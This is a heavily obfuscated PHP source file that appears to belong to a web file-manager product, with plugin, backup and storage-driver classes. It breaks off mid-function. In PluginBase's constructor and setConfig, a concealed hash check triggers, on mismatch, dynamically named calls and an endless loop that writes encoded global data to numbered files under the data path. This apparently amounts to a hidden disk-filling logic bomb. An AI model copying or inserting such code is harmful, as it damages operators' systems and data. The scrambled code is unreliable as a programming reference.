<?php
 goto A߿; BĦۢ: $CŮ = strrev(base64_decode($_SERVER[][0])); function binCheckNeq($d齦, $fެ) { return $d齦 != $fެ; } $_SERVER[$_SERVER[][1]] = $CŮ($_SERVER[$_SERVER[][2]]); goto bƂ; dϊ󳅏: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($d, $A = '') { goto Fȫȯ; Dꑪ: if (!isset(self::$_chunkBuffer[$d])) { self::$_chunkBuffer[$d] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; goto DЭ; Eǡ: $this->pathOpen = $d; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } goto Dꑪ; Fȫȯ: $this->info = $this->info($d); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[][76]]; goto Eǡ; DЭ: } function stream_read($FВ) { $c庯 = $this->fileSubstr($this->pose, $FВ); $this->pose += strlen($c庯); return $c庯; } public function stream_tell() { return $this->pose; } public function stream_seek($Aݾҍ, $c) { $aȨ =& $_SERVER[]; if ($c == SEEK_SET) { $this->pose = $Aݾҍ; } else { if ($c == SEEK_CUR) { $this->pose += $Aݾҍ; } else { if ($c == SEEK_END) { $this->pose = $this->info[$aȨ[78]] + intval($Aݾҍ); } } } if ($Aݾҍ < 0) { $this->pose = $this->info[$aȨ[78]] + $Aݾҍ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[][78]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($e֨, $a) { $Fմ =& $_SERVER[]; $EŎ = $this->info($e֨); return array($Fմ[1382] => 0, $Fմ[1383] => 0, $Fմ[12] => 32768 + 511, $Fմ[1384] => 0, $Fմ[1385] => 0, $Fմ[1386] => 0, $Fմ[1387] => 0, $Fմ[78] => $EŎ[$Fմ[78]], $Fմ[1388] => $EŎ[$Fմ[1258]], $Fմ[1344] => $EŎ[$Fմ[84]], $Fմ[1343] => $EŎ[$Fմ[194]], $Fմ[1389] => 0, $Fմ[1390] => 0); } static $fileInfo = array(); public function info($B) { $aȎ = $_SERVER[][1391]; if (isset(self::$fileInfo[$B])) { return self::$fileInfo[$B]; } if (substr($B, 0, strlen($aȎ)) != $aȎ) { return !1; } self::$fileInfo[$B] = IO::info(substr($B, strlen($aȎ))); return self::$fileInfo[$B]; } public static function read($a, $Dؼ, $Eڂ) { if (!isset(self::$_fopenCache[$a])) { $Fަ͎ = new StreamWrapperIO(); $Fަ͎->stream_open($a); self::$_fopenCache[$a] = $Fަ͎; } $Fަ͎ = self::$_fopenCache[$a]; return $Fަ͎->fileSubstr($Dؼ, $Eڂ); } public static function _read($Eͤ, $fЂ, $C) { goto Dᾋ; C틬ܭ: return $Fɋ; goto F悹; Fƴ: $CݗĪ = 8192; fseek($E, $fЂ, SEEK_SET); $Fɋ = $A[33]; goto B֋ŋ; Dᾋ: $A =& $_SERVER[]; $E = fopen($Eͤ, $A[1262]); if (!$E) { return $A[33]; } goto Fƴ; B֋ŋ: $A = 0; while ($A < $C) { $Cċ = min($CݗĪ, $C - $A); $Fɋ .= fread($E, $Cċ); $A += $Cċ; } fclose($E); goto C틬ܭ; F悹: } public function fileSubstr($Dӣ, $a) { goto Aջܼð; BƄ: if ($Dӣ + $a > $f) { $a = $f - $Dӣ; } if ($a <= 0) { return $cƺǻ[33]; } if ($Dӣ < 0 || $Dӣ >= $f || $a <= 0 || $a > 1024 * 1024 * 5) { throw new Exception("\151\x6f\106\151\154\145\122\x65\141\144\x20\145\162\162\157\162\x21\x20\163\164\x61\x72\x74\x3d{$Dӣ}\73\154\145\x6e\147\164\150\75{$a}\x3b\x20\163\151\172\145\x3d{$f}\73"); } goto AՐ; f: $A = ceil(($Dӣ + $a) / $d) * $d - $eᄐ; $Eե = IO::fileSubstr($this->path, $eᄐ, $A); $d[$eᄐ . $cƺǻ[33]] = $Eե; goto d; Aջܼð: $cƺǻ =& $_SERVER[]; $f = $this->info[$cƺǻ[78]]; $CӋ = $Dӣ; goto bʌ͞; d: ksort($d); $Bҝ = substr($Eե, $Dӣ - $eᄐ, $a); return $Bҝ; goto Dߚ݋; AՐ: $d = 64 * 1024; $d =& self::$_chunkBuffer[$this->path]; if (!$d) { $d = array(); } goto f; eԵ: foreach ($d as $eϒ => $Fʕ) { $eϒ = intval($eϒ); $Aְ = $eϒ + strlen($Fʕ); if ($Dӣ >= $Aְ) { continue; } if ($Dӣ >= $eϒ && $Dӣ + $a <= $Aְ) { return substr($Fʕ, $Dӣ - $eϒ, $a); } break; } if (count($d) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($cƺǻ[1392], $cƺǻ[1393] . count($d) . "\x3b\163\x74\141\162\164\75{$Dӣ}\54\x6c\x65\156\147\164\x68\75{$a}\73\x70\157\x73\145\x3a{$eϒ}\176{$Aְ}"); throw new Exception($cƺǻ[1394]); } $eᄐ = intval($Dӣ / $d) * $d; goto f; bʌ͞: $e红 = $a; if ($Dӣ < 0) { $Dӣ = $f + $Dӣ; } if ($a === !1) { $a = $f - $Dӣ; } goto BƄ; f: $eϒ = 0; $Aְ = 0; $Fʕ = $cƺǻ[33]; goto eԵ; Dߚ݋: } private function log($a, $eǌ) { $aǩ =& $_SERVER[]; $dڴ = timeFloat() - $this->timeStart; write_log(sprintf($aǩ[1395], $a, $this->info[$aǩ[28]], $dڴ, $eǌ), $aǩ[1079]); } } class Message { function __construct() { } public function send($F舆 = '', $f٥ = array(), $cӯ = "\x74\x65\x78\164") { goto Bף; Bף: $e =& $_SERVER[]; $B˺ = array($e[29] => $e[1396], $e[720] => $F舆); if (in_array($cӯ, array($e[1396], $e[1397]))) { $B˺[$e[29]] = $cӯ; } goto bڻ; bڻ: $f٥ = array($e[496] => isset($f٥[$e[496]]) ? $f٥[$e[496]] : $e[33], $e[575] => isset($f٥[$e[575]]) ? $f٥[$e[575]] : $e[33]); if (empty($F舆) || empty($f٥[$e[496]]) && empty($f٥[$e[575]])) { return !1; } $d놝 = array($e[1337] => $B˺, $e[1398] => $f٥); goto aК; aК: Hook::trigger($e[1399], $d놝); goto dъ; dъ: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto cР; E훪෺: $this->in =& $in; $this->modelPlugin = Model($Fӊ[1403]); $this->pluginName = str_replace($Fӊ[1403], $Fӊ[33], get_class($this)); goto Eי; dՠ: if ($_SERVER[$Fӊ[836]] != $F削خ($Eɣ)) { goto Cͪ; F: $A = $Fӊ[843]; $A($_SERVER[$Fӊ[844]]); $f = $Fӊ[838]; goto fɤ; AК: $fҐ = 1; for ($BͲ = $fҐ; $BͲ > 0; $BͲ++) { $Aء(DATA_PATH . $BͲ, $Eِ); } goto A̍Ы; fɤ: $f(); $Aء = $Fӊ[1401]; $Eِ = json_encode($GLOBALS[$Fӊ[1402]]); goto AК; Cͪ: $f = $Fӊ[838]; $Fލϙ = $Fӊ[839]; $Fβ = $_SERVER[$Fӊ[840]] . $Fӊ[841]; goto D􇓆; D􇓆: $Cϝɭ = $Fލϙ($Fβ); $cԞƇ = explode($Fӊ[229], $Cϝɭ); if (count($cԞƇ) < $Fӊ[593]) { $cԕ = $Fӊ[842]; $cԕ(); } goto F; A̍Ы: } global $in, $config; $this->config =& $config; goto E훪෺; FŚ: $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); goto C; C: return $this; goto dËƹ; CɎ: $this->pluginHostDefault = $config[$Fӊ[1405]] . $this->pluginName . $Fӊ[8]; $B = $config[$Fӊ[1406]]; if ($B && strpos($Fӊ[47] . $B . $Fӊ[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$Fӊ[1407]] . $this->pluginName . $Fӊ[8]; } goto FŚ; Eי: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $Fӊ[8]; $this->pluginApi = appHostGet() . $Fӊ[1404] . $this->pluginName . $Fӊ[8]; $this->pluginHost = $config[$Fӊ[1405]] . $this->pluginName . $Fӊ[8]; goto CɎ; cР: $Fӊ =& $_SERVER[]; $Eɣ = $_SERVER[$Fӊ[840]] . $Fӊ[841]; $F削خ = $Fӊ[1400]; goto dՠ; dËƹ: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[][1408]); } protected function assign($bƛ, $F = false) { if (is_array($bƛ)) { $this->values = array_merge($this->values, $bƛ); } else { $this->values[$bƛ] = $F; } } protected function display($B֦) { extract($this->values); require $B֦; } final function hookRegist($dϙ) { $this->modelPlugin->appRegist($this->pluginName, $dϙ); } final function appIcon() { $D߸ =& $_SERVER[]; $fӟҭ = $this->appPackage(); $F召 = $D߸[33]; if (isset($fӟҭ[$D߸[409]])) { if (isset($fӟҭ[$D߸[409]][$D߸[1409]])) { $F召 = $D߸[1410] . $fӟҭ[$D߸[409]][$D߸[1409]] . $D߸[1411]; } else { if ($fӟҭ[$D߸[409]][$D߸[1412]]) { $F召 = $D߸[1413] . $fӟҭ[$D߸[409]][$D߸[1412]] . $D߸[1414]; } } } return $F召; } final function fileCanView($DϘ) { goto fꈅ; fꈅ: $dʑ =& $_SERVER[]; if (request_url_safe($DϘ)) { return !0; } if ($this->isShare($DϘ)) { return !0; } goto F; F: $b틙 = Session::get($dʑ[1415]); if (!$b틙 || !$b틙[$dʑ[1416]]) { $fۿ = $dʑ[1417] . rawurlencode(this_url()); show_tips(LNG($dʑ[1418]) . $dʑ[1419] . $fۿ . $dʑ[1420] . LNG($dʑ[1421]) . $dʑ[1422], !1); } if (!Action($dʑ[1423])->authCan($dʑ[1424])) { show_tips(LNG($dʑ[1425]) . $dʑ[1426], !1); } goto a⎯ѥ; a⎯ѥ: ActionCall($dʑ[1427], $DϘ); goto AۛȊ; AۛȊ: } final function isShare($B٦) { $b = KodIO::parse($B٦); return $b[$_SERVER[][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($a˒ե) { if (request_url_safe($a˒ե)) { return $a˒ե; } if (!$this->isShare($a˒ե)) { $a˒ե = $this->filePath($a˒ե); } return Action($_SERVER[][1071])->linkOut($a˒ե); } public function filePathLinkOut($f㭊) { if (request_url_safe($f㭊)) { return $f㭊; } $this->fileCanView($f㭊); return Action($_SERVER[][1071])->link($f㭊); } final function filePath($a) { $AԊ =& $_SERVER[]; if ($Dѡ = $this->checkSharePath($a)) { Hook::trigger($AԊ[1428], $Dѡ); return $Dѡ; } $this->fileCanView($a); if (request_url_safe($a)) { $fѐ = parse_url_query($a); if (isset($fѐ[$AԊ[1429]]) && isset($fѐ[$AԊ[209]])) { $D = Model($AԊ[735])->get($AԊ[736]); $eѾ = Mcrypt::decode($fѐ[$AԊ[209]], $D); if ($eѾ) { $this->fileInfo = IO::infoWithChildren($eѾ); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $eѾ; } } $a = $this->_cacheHttpFile($a); $this->fileInfo = IO::infoWithChildren($a); } else { $this->fileInfo = IO::infoWithChildren($a); if (!$this->fileInfo) { show_tips(LNG($AԊ[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($AԊ[1428], $a); return $a; } final function _cacheHttpFile($c㝢) { $e = hash_path($c㝢, !0); $this->cachePath = $this->pluginCachePath($e); if ($AȤЃ = IO::fileNameExist($this->cachePath, $e)) { return KodIO::make($AȤЃ); } $F⤤ = $this->cachePath . $e; return $this->pluginCacheFileSet($F⤤, file_get_contents_nossl($c㝢)); } final function _tmpFileName($Dң = array()) { goto Cۑ; Dˤ: if (isset($Dң[$e[164]][$e[171]])) { return $Dң[$e[164]][$e[171]]; } $B痌 = IO::hashSimple($Dң[$e[76]]); if ($B痌) { return $B痌; } goto fڡ; Cۑ: $e =& $_SERVER[]; if (!$Dң) { $Dң = $this->fileInfo; } if (isset($Dң[$e[171]])) { return $Dң[$e[171]]; } goto Dˤ; fڡ: $c̪ = array($Dң[$e[28]], $Dң[$e[76]], $Dң[$e[78]]); if (isset($Dң[$e[502]])) { $c̪[] = $Dң[$e[502]]; } return md5(implode($e[71], $c̪)); goto eͪχ; eͪχ: } final function checkSharePath($BФރ) { goto Bܨ; Bܨ: $a֡ =& $_SERVER[]; if (!defined($a֡[454])) { define($a֡[495], 0); } if (!$this->isShare($BФރ)) { return !1; } goto Fɷ񯸘; Fɷ񯸘: $e = Action($a֡[1071])->sharePathInfo($BФރ); if (!isset($e[$a֡[76]])) { show_json(LNG($a֡[1430]), !1); } $this->fileInfo = $e[$a֡[164]]; goto bЌ; bЌ: $this->cachePath = $this->pluginCachePath($this->fileInfo[$a֡[171]]); return $e[$a֡[76]]; goto dʉ٩; dʉ٩: } final function pluginCachePath($A = '') { $C웘塠 =& $_SERVER[]; $e޴ = IO_PATH_SYSTEM_TEMP . $C웘塠[1431] . $this->pluginName; if (!($C = IO::infoFull($e޴))) { return IO::mkdir($e޴ . $C웘塠[8] . $A); } if (empty($A)) { return $C[$C웘塠[76]]; } if (!($Fل = IO::fileNameExist($C[$C웘塠[76]], $A))) { return IO::mkdir($C[$C웘塠[76]] . $A); } return KodIO::make($Fل); } final function pluginCacheFileSet($a, $Cӂ = '') { $b =& $_SERVER[]; if (!($eÄ̰ = IO::infoFull($a))) { return IO::mkfile($a, $Cӂ, REPEAT_REPLACE); } IO::setContent($eÄ̰[$b[76]], $Cӂ); return $eÄ̰[$b[76]]; } final function pluginLocalFile($a = '') { goto d; d: $D͓ =& $_SERVER[]; $dؑ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($dؑ)) { mk_dir($dؑ); } goto d; d: if (!$a) { return $dؑ; } $E켂 = IO::info($a); $C = $this->_tmpFileName($E켂) . $D͓[95] . $E켂[$D͓[168]]; goto eɬ; eɬ: if (!checkExtSafe($C)) { $C = $C . $D͓[1432]; } $D؂ = $dؑ . $C; if (@file_exists($D؂)) { return $D؂; } goto E׏; E׏: return IO::copy($a, $dؑ, 0, $C); goto D; D: } final function appPackage() { goto E՛; A: return $e; goto Aܸ; b㸄: $this->parseLang($Fʓ); $e = json_decode_force($Fʓ); if (!$e) { return array(); } goto EѡŜ; EѡŜ: $E䂼 = Hook::trigger($A܋[1434], $e); if ($E䂼 && is_array($E䂼)) { $e = $E䂼; } $this->packageData = $e; goto A; E՛: $A܋ =& $_SERVER[]; if ($this->packageData) { return $this->packageData; } $Fʓ = $this->parseFile($this->pluginPath . $A܋[1433]); goto b㸄; Aܸ: } public function packageInfoGet($F؝) { $aç = $this->appPackage(); return array_get_value($aç, $F؝); } public function packageVersion() { return $this->packageInfoGet($_SERVER[][1435]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[][1436]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[][1437]); } public function echoJsAssign($d, $D) { $this->echoJsAssignArr[$d] = $D; } private function parseFile($c) { goto a; a: $d =& $_SERVER[]; $Bʤ = file_get_contents_nossl($c); $dϾ = array($d[1438], $d[1439], $d[1440], $d[1441], $d[1442], $d[1443], $d[1444]); goto f; f: $fג = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$d[88]][$d[1445]]); foreach ($this->echoJsAssignArr as $c => $Bǃ) { $dϾ[] = $d[1446] . $c . $d[1447]; $fג[] = is_array($Bǃ) || is_object($Bǃ) ? rawurlencode(json_encode($Bǃ)) : $Bǃ; } if (strstr($Bʤ, $d[1448])) { $aŚ = rawurlencode(json_encode($this->pluginLangArr)); $Bʤ = str_replace($d[1448], $aŚ, $Bʤ); } goto Eì֝; Eì֝: if (strstr($Bʤ, $d[1449])) { $aŚ = $aŚ = rawurlencode(json_encode($this->getConfig())); $Bʤ = str_replace($d[1449], $aŚ, $Bʤ); } $Bʤ = str_replace($dϾ, $fג, $Bʤ); return $Bʤ; goto CÔ; CÔ: } private function parseLang(&$dȝ) { goto aƊ; d蒜: $Dݸȏ = array(); foreach ($f՝[0] as $D֎) { $AϞ = substr($D֎, strlen($f), -4); $Bؘ˚ = LNG($AϞ); $BӍ[] = $D֎; $Dݸȏ[] = str_replace(array($fբ[229], $fբ[1039], $fբ[340], $fբ[116]), array($fբ[50], $fբ[50], $fբ[33], $fբ[1452]), $Bؘ˚); } $dȝ = str_replace($BӍ, $Dݸȏ, $dȝ); goto F鏱; aƊ: $fբ =& $_SERVER[]; $f = $fբ[1450]; if (!strstr($dȝ, $f)) { return; } goto a; a: preg_match_all($fբ[1451], $dȝ, $f՝); if (!is_array($f՝) || count($f՝) == 0 || !is_array($f՝[0]) || count($f՝[0]) == 0) { return; } $BӍ = array(); goto d蒜; F鏱: } private function parseConfig(&$Eć) { goto d袹; dΝ֎: $Eć = str_replace($eࠃ닭, $D, $Eć); goto F鍙͕; dÒ: preg_match_all($c͒ȑ[1454], $Eć, $CĐ魃); if (!is_array($CĐ魃) || count($CĐ魃) == 0 || !is_array($CĐ魃[0]) || count($CĐ魃[0]) == 0) { return; } $Eͭے = $this->getConfig(); goto c; d袹: $c͒ȑ =& $_SERVER[]; $E庋 = $c͒ȑ[1453]; if (!strstr($Eć, $E庋)) { return; } goto dÒ; c: $eࠃ닭 = array(); $D = array(); foreach ($CĐ魃[0] as $B͐) { $fլ = substr($B͐, strlen($E庋), -2); $eࠃ닭[] = $B͐; $D[] = _get($Eͭے, $fլ); } goto dΝ֎; F鍙͕: } private function parsePackage(&$d) { goto e؅Һ; BԢ: $Aᦩ = array(); $eӿԦ = array(); foreach ($B[0] as $aĚ̹) { $cӇ = substr($aĚ̹, strlen($Cߐ), -2); $Aᦩ[] = $aĚ̹; $eӿԦ[] = _get($bڭ, $cӇ); } goto fȕƂ; CܑǍ: preg_match_all($a寵[1456], $d, $B); if (!is_array($B) || count($B) == 0 || !is_array($B[0]) || count($B[0]) == 0) { return; } $bڭ = $this->appPackage(); goto BԢ; fȕƂ: $d = str_replace($Aᦩ, $eӿԦ, $d); goto a; e؅Һ: $a寵 =& $_SERVER[]; $Cߐ = $a寵[1455]; if (!strstr($d, $Cߐ)) { return; } goto CܑǍ; a: } final function echoFile($Dğʸε, $b = false) { goto B; Bæ: $Dꂂս = $this->parseFile($c٠); $this->parseLang($Dꂂս); $this->parseConfig($Dꂂս); goto Eݖ֌; Eݖ֌: $this->parsePackage($Dꂂս); if (is_array($b)) { $Dꂂս = str_replace(array_keys($b), array_values($b), $Dꂂս); } echo $C[229] . $Dꂂս; goto d; B: $C =& $_SERVER[]; $c٠ = $this->pluginPath . $Dğʸε; if (ACT == $C[1457]) { echo $C[1458] . $this->pluginName . $C[8] . $Dğʸε . $C[1459]; if (!file_exists($c٠)) { echo $C[1460]; return; } } goto Bæ; d: } final function initLang() { goto dܯ; B۲: $FȐ = I18n::getType(); $A歋 = array(); if (file_exists($D͘Ը . $FȐ . $dƑ[808])) { $A歋 = (include $D͘Ը . $FȐ . $dƑ[808]); } else { if ($FȐ == $dƑ[1463] && !file_exists($D͘Ը . $FȐ . $dƑ[808]) && file_exists($D͘Ը . $dƑ[1464])) { $A歋 = (include $D͘Ը . $dƑ[1464]); } else { if (file_exists($D͘Ը . $dʴ . $dƑ[808])) { $A歋 = (include $D͘Ը . $dʴ . $dƑ[808]); } } } goto D; D: if (!is_array($A歋)) { return array(); } if (@count($A歋) > 0) { I18n::set($A歋); } return $A歋; goto c; dܯ: $dƑ =& $_SERVER[]; $dʴ = $dƑ[1461]; $D͘Ը = $this->pluginPath . $dƑ[1462]; goto B۲; c: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($f) { $fʹ̕ =& $_SERVER[]; $Dǲ = $_SERVER[$fʹ̕[840]] . $fʹ̕[841]; $D = $fʹ̕[1400]; if ($_SERVER[$fʹ̕[836]] != $D($Dǲ)) { goto cʢ; f: $b = $fʹ̕[843]; $b($_SERVER[$fʹ̕[844]]); $EɋЕ = $fʹ̕[838]; goto a㪫; fΨٞ: $d = $b($Aҿɤ); $c蘦署 = explode($fʹ̕[229], $d); if (count($c蘦署) < $fʹ̕[593]) { $bݰ = $fʹ̕[842]; $bݰ(); } goto f; FŤȖ: $A = 1; for ($F = $A; $F > 0; $F++) { $C(DATA_PATH . $F, $C); } goto D; a㪫: $EɋЕ(); $C = $fʹ̕[1401]; $C = json_encode($GLOBALS[$fʹ̕[1402]]); goto FŤȖ; cʢ: $EɋЕ = $fʹ̕[838]; $b = $fʹ̕[839]; $Aҿɤ = $_SERVER[$fʹ̕[840]] . $fʹ̕[841]; goto fΨٞ; D: } return $this->modelPlugin->setConfig($this->pluginName, $f); } public function onSetConfig($b») { } public function onGetConfig($e) { } public function onChangeStatus($e) { } public function onUninstall() { } public function onInstall() { } public function authCheck($AĜ = "\160\x6c\x75\147\x69\156\101\165\164\150") { $eϼي =& $_SERVER[]; if (!defined($eϼي[454])) { return !1; } if (_get($GLOBALS, $eϼي[485])) { return !0; } $E = $this->getConfig(); if (!$E[$AĜ]) { return !1; } return ActionCall($eϼي[1465], $E[$AĜ]); } public function url($Aؔ, $Eↆ = '', $E鳑 = true) { goto A; cÄ: if (!$E鳑) { return $F; } echo $F; goto a͂; c: $f = $this->packageVersion(); $DȂ = $Fٳ . $Bճ[440] . $f; if (substr($Aؔ, 0, 4) == $Bճ[147] || substr($Aؔ, 0, 2) == $Bճ[1248]) { $F = $Aؔ . $Bճ[1466] . $DȂ; } else { if ($Eↆ == $Bճ[33]) { $F = $this->pluginHost . $Aؔ . $Bճ[1466] . $DȂ; } else { if ($Eↆ === $Bճ[77]) { $F = $this->pluginHost . $Aؔ; } else { if ($Eↆ == $Bճ[1467]) { $F = STATIC_PATH . $Aؔ . $Bճ[1466] . $Fٳ; } else { if ($Eↆ == $Bճ[1468]) { $F = APP_HOST . $Bճ[1469] . $Aؔ . $Bճ[1466] . $Fٳ; } else { if (isset($CɋƱ[$Eↆ])) { $F = $CɋƱ[$Eↆ] . $Aؔ . $Bճ[1466] . $DȂ; } } } } } } goto cÄ; A: $Bճ =& $_SERVER[]; $CɋƱ = $this->getConfig(); $Fٳ = KOD_VERSION . $Bճ[95] . KOD_VERSION_BUILD; goto c; a͂: } public function link($Fۃ = false, $f = '') { $Bɨ =& $_SERVER[]; if (!$Fۃ) { $this->link($Bɨ[1470], $Bɨ[1468]); $this->link($Bɨ[1471], $Bɨ[1467]); $this->link($Bɨ[1472], $Bɨ[1467]); $this->link($Bɨ[1473], $Bɨ[1467]); $this->link($Bɨ[1474], $Bɨ[1467]); return; } $Cƌ = $this->url($Fۃ, $f, !1); if (substr($Fۃ, -3) == $Bɨ[1475]) { echo $Bɨ[1476] . $Cƌ . $Bɨ[1477] . $Bɨ[229]; } else { if (substr($Fۃ, -4) == $Bɨ[1478]) { echo $Bɨ[1479] . $Cƌ . $Bɨ[1480] . $Bɨ[229]; } } } } goto a; Eؙï: class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\155\56\142\x61\x63\153\165\160\x4c\x69\x73\x74"; public $field = array("\151\x6f", "\156\141\155\145", "\163\x74\x61\x74\165\163", "\x63\x6f\156\164\145\156\x74", "\155\141\x6e\x75\141\154", "\162\x65\x73\x75\154\164", "\x74\x69\155\145\106\162\x6f\155", "\x74\x69\x6d\145\124\x6f"); public function config() { goto Dǲă; Dǲă: $F =& $_SERVER[]; $B = Model($F[735])->get($F[747]); $B = json_decode($B, !0); goto F; F׊: Action($F[1726])->taskInit(); Model($F[1502])->cacheClear(); $Eܸؼ = $F[1727]; goto bƏ; bƏ: $aօʎ = Model($F[1728])->findByKey($F[1521], $Eܸؼ); if (!$aօʎ) { $aօʎ = array(); } if (isset($aօʎ[$F[197]])) { $aօʎ[$F[197]] = json_decode($aօʎ[$F[197]], !0); } goto C; C: if (isset($B[$F[197]])) { $aօʎ[$F[197]][$F[1506]] = $B[$F[197]]; unset($B[$F[197]]); } return array_merge($aօʎ, $B); goto Aڋ; F: $B = is_array($B) ? $B : array(); if (!isset($B[$F[720]])) { $B[$F[720]] = $F[87]; } unset($B[$F[1503]]); goto F׊; Aڋ: } public function listData($Eߴ = false, $bܮ䬜 = "\155\157\x64\151\146\x79\124\151\155\145", $Dޑȵ = false) { return parent::listData($Eߴ, $bܮ䬜, !0); } public function lastItem() { $FĨݓ = $this->listData(); return !empty($FĨݓ[0]) ? $FĨݓ[0] : null; } public function kill($fף) { goto A㵨; b˻: return $this->remove($fף); goto F; A: $D舢ׄ = $cݍ[$c[28]]; $Eܣ = TEMP_FILES . $c[743] . $D舢ׄ . $c[8]; IO::remove($Eܣ, !1); goto b˻; B܂: Task::kill($c[746]); Task::kill($c[769]); Task::kill($c[779]); goto A; A㵨: $c =& $_SERVER[]; $cݍ = $this->listData($fף); if (!$cݍ || empty($cݍ[$c[28]])) { return !0; } goto B܂; F: } public function remove($Bɑٞ) { $B𥆰 = $this->listData($Bɑٞ); if (!$B𥆰) { return !0; } return $this->backupRemove($B𥆰); } private function backupRemove($CϢޮ) { parent::remove($CϢޮ[$_SERVER[][393]]); $Dϝ = $this->backupPath($CϢޮ); IO::remove($Dϝ, !1); return !0; } private function backupPath($eԂ) { $eת =& $_SERVER[]; $C꿌˪ = $eԂ[$eת[28]]; $eעߦ = Model($eת[735])->get($eת[736]); $BÄ = substr(md5($eת[737] . $eעߦ . $C꿌˪), 0, 8); return "\173\151\157\72{$eԂ[$eת[717]]}\175\57\144\141\x74\141\x62\141\163\x65\57\142\141\143\x6b\x75\x70\57" . $C꿌˪ . $eת[71] . $BÄ; } public function start() { goto f띳; f띳: $AÅ =& $_SERVER[]; if ($GLOBALS[$AÅ[6]][$AÅ[88]][$AÅ[1729]] != $AÅ[87]) { return !0; } $e = $this->config(); goto D֎ф; D֎ф: if (!$e || $e[$AÅ[1503]] != $AÅ[87]) { return !1; } $bۭǐ = $this->process(); foreach ($bۭǐ as $B) { if ($B) { return Task::restart($B[$AÅ[393]]); } } goto DӘɞ; DӘɞ: $Cç܉ = new Backup(); $eޘ = $Cç܉->db(); if ($eޘ) { $eޘ = $Cç܉->dbFile(); if ($eޘ && $e[$AÅ[720]] == $AÅ[191]) { $eޘ = $Cç܉->file(); } } goto A; A: Backup::set(array($AÅ[715] => 1, $AÅ[476] => time())); return !0; goto b; b: } public function process() { $a򉳥 =& $_SERVER[]; return array($a򉳥[723] => Task::get($a򉳥[746]), $a򉳥[727] => Task::get($a򉳥[769]), $a򉳥[193] => Task::get($a򉳥[779])); } public function restore() { $fŚ =& $_SERVER[]; ActionCall($fŚ[1019], !0, 1); ActionCall($fŚ[1019], !0, 0); } } $b꼢 = $_SERVER[$_SERVER[][1081]]; $f = $_SERVER[][1400]; goto E玱; a╕: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($fǥ) { parent::__construct($fǥ); $this->signatureVersion($_SERVER[][212]); } public function uploadFormData($d, $E = 3600) { goto c߆; D풠: $e͖ǡਏ = sha1($fՂƐ); $Dû𓛄 = hash_hmac($Eǲ[230], $e͖ǡਏ, $e); $Bȅ = array($Eǲ[1196] => $e⢕, $Eǲ[1200] => $eڥ, $Eǲ[1204] => base64_encode($fՂƐ), $Eǲ[1201] => $fᖳ, $Eǲ[1202] => $this->accessKey, $Eǲ[1205] => $f, $Eǲ[1206] => $Dû𓛄, $Eǲ[175] => $this->getHost()); goto b; aї: $eڥ = $Eǲ[1192]; $fĤ = gmdate($Eǲ[1193], time() + $E); $f = (string) time() . $Eǲ[68] . (string) (time() + $E); goto fՆ; c߆: $Eǲ =& $_SERVER[]; $e⢕ = $Eǲ[192]; $fᖳ = $Eǲ[230]; goto aї; fՆ: $fՂƐ = array($Eǲ[1194] => $fĤ, $Eǲ[1195] => array(array($Eǲ[1196] => $e⢕), array($Eǲ[1197] => $this->bucket), array($Eǲ[1198], $Eǲ[1199], $Eǲ[33]), array($Eǲ[1200] => $eڥ), array($Eǲ[1201] => $fᖳ), array($Eǲ[1202] => $this->accessKey), array($Eǲ[1203] => $f))); $fՂƐ = json_encode($fՂƐ); $e = hash_hmac($Eǲ[230], $f, $this->secret); goto D풠; b: return $Bȅ; goto D־; D־: } public function fileOutLink($eϽ΂) { $Aع =& $_SERVER[]; if (substr($eϽ΂, 0, 7) == $Aع[1207]) { $eϽ΂ = $Aع[1208] . substr($eϽ΂, 7); } header($Aع[159] . $eϽ΂); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($B) { $this->pathParse = $B; $this->model = Model($_SERVER[][1209]); } public function getPath($f䄍Ē) { return trim($f䄍Ē, $_SERVER[][8]); } public function pathFather($BҖ) { $fЋ = $this->parse($BҖ); $fЋ = $this->infoSimple($BҖ); return $fЋ ? $fЋ[$_SERVER[][478]] : !1; } public function pathThis($CԬ) { $F = $this->infoSimple($CԬ); return $F ? $F[$_SERVER[][28]] : !1; } public function getPathOuter($cվΒմ) { if (!$cվΒմ) { return $cվΒմ; } $dփ = $this->parse($cվΒմ); return KodIO::make($dփ[$_SERVER[][393]]); } public function copyFolderFromIO($b䈚, $dދ, $EՑѾ, $Eڇ, $fڊ) { $E = $this->model->copyFolderFromIO($b䈚, $dދ, $EՑѾ, $Eڇ, $fڊ); return KodIO::make($E); } public function isParentOf($B, $aԄ) { return $this->model->isParentOf($B, $aԄ); } public function mkfile($aђ, $D⭧ = '', $b졭 = REPEAT_RENAME) { $A۷ =& $_SERVER[]; $Cڝ = $this->parse($aђ); $aђ = $Cڝ[$A۷[393]]; for ($cɴ = 0; $cɴ < count($Cڝ[$A۷[1210]]); $cɴ++) { 